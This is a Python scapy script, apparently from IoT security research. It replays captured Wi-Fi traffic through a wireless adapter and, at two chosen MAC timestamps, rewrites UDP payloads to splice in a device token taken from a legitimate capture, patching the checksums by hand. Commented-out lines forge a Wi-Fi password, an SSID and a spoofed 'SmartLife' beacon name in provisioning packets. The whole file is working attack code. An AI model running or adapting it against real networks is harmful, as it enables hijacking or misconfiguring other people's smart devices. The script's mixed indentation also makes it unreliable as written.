#!/usr/bin/python
from scapy.all import *
import time, sys
import time
start=time.time()
pkts = rdpcap(sys.argv[1])
packet=rdpcap("legitimate_v5.pcapng")
clk = pkts[0].time
mac_timestamp1 = 1454451804007
mac_timestamp2 = 1454451804305
crTok_packet_number = 5522
WiFi_adapter = "wlx00117f1bf2cb"
for p in pkts:
   time.sleep(p.time - clk)
   clk = p.time
   #if p.haslayer(IP) and p.haslayer(Raw):
   #if p.haslayer(Dot11Elt[2]) and p[RadioTap].mac_timestamp==4013760052:
   		#	if (p[IP].src=='192.168.43.2' and p[IP].dst=='192.168.43.255'):
		#			if p.haslayer(UDP):
		#				print(p)
		#				t=p[Raw].load.split("{")
		#				print(t)
		#				p1=t[1].split(",")
		#				print(p1[2])
			#			sport_new=p[UDP].sport
			#	        	print(sport_new)
			#			k=p[Dot11].SC
		        #               	p[Dot11].SC=k+32
			#			print(k)
		#				p[Raw].load=t[0]+"{"+"\"passwd\":\"cebh1234\""+","+p1[1]+","+"\"ssid\":\"cyberes\""+","+p1[3]
   #if p.haslayer(Dot11Elt[2]) and p[RadioTap].mac_timestamp==4013760052:
	#					print(p)
	##					print(t)
	#					p1=t[1].split(",")
	#					print(p1[2])
	#					p[Dot11Elt][2].info=t[0]+"{"+"\"passwd\":\"cebh1234\""+","+p1[1]+","+"\"ssid\":\"cyberes\""+","+p1[3]
   #if(p.haslayer(Dot11FCS)):   
   #if p[RadioTap].mac_timestamp==2063116331633:
   #	p[Dot11Elt].info="SmartLife-178E"
   #p[Dot11FCS].addr1="38:1F:8D:B2:17:8F"


   if p[RadioTap].mac_timestamp==mac_timestamp1 or p[RadioTap].mac_timestamp==mac_timestamp2:
   					m=packet[crTok_packet_number][Raw].load.split('}')[1]
   #		#	if (p[IP].src=='192.168.43.2' and p[IP].dst=='192.168.43.255'):
   					if p.haslayer(UDP):
   						print(p)
   						t=p[Raw].load.split('}')
						print(p[Raw])
                                                k=t[0].split(',')
                                                p[Raw].load=k[0]+","+k[1]+","+k[2]+","+"\"token\":\"IND3ik6C8X3Xm2\""+"}"+m
						if p[RadioTap].mac_timestamp==mac_timestamp1:
						#p[Dot11FCS].fcs=1631447449
							p[UDP].chksum=63976
   						if p[RadioTap].mac_timestamp==mac_timestamp2:
							p[UDP].chksum=5266
						print(p[Raw])
						print(p)
   sendp(p,iface=WiFi_adapter)
end=time.time()
print("Execution time of the program is- ", end-start)	


